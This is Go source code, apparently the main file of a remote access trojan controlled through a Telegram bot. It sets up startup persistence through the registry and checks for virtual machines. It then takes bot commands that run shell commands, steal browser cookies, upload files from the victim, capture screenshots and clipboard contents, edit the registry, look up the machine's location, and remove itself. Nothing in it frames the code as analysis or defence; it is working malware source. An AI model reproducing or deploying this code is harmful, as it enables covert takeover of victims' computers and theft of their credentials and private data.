package main

import (
	"log"
	"os"
	"strings"

	conf "payload/config"
	lib "payload/internal"

	tg "github.com/go-telegram-bot-api/telegram-bot-api"
)

func main() {
	f := &lib.FileInf{
		FileName: strings.TrimSuffix(conf.NNAME, ".exe"), //Name of the new registry string.
	}
	f.Startup()
	f.RuntimeVM()

	bot, err := tg.NewBotAPI(conf.API)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = conf.DEBUG_MODE

	u := tg.NewUpdate(0)
	u.Timeout = conf.TIMEOUT

	updates, err := bot.GetUpdatesChan(u)
	if err != nil {
		log.Panic(err)
	}
	for update := range updates {
		if update.Message != nil {
			telComd := update.Message.Command()
			chatID := update.Message.Chat.ID
			msg := tg.NewMessage(chatID, "")

			/*
				Use to set-up Telegram command.
			*/
			command := func() string {
				return strings.Trim(update.Message.Text, "/"+telComd)
			}

			if conf.MSG_REPLY {
				msg.ReplyToMessageID = update.Message.MessageID
			}

			go func() {
				switch telComd {
				case "help", "start":
					msg.Text = conf.HELP
				case "kill":
					os.Exit(0)
				case "remove":
					f.SelfRemove()
				case "shell", "sh":
					msg.Text = f.RShell(command())
				case "cookie":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.Cookies(lib.Argument(command(), " ", 2))
				case "download":
					bot.Send(tg.NewDocumentUpload(chatID, lib.Argument(command(), " ", 1)))
				case "screen":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.CaptureScreen()
				case "geoip":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.GeoIP()
				case "registry":
					msg.Text = lib.RegistryMethod(lib.Argument(command(), " ", 1),
						lib.Argument(command(), " ", 2),
						lib.Argument(command(), " ", 3),
						lib.Argument(command(), " ", 4))
				case "clipboard":
					msg.Text = f.GetClipboard()
				}
				bot.Send(msg)
			}()
		}
	}
}
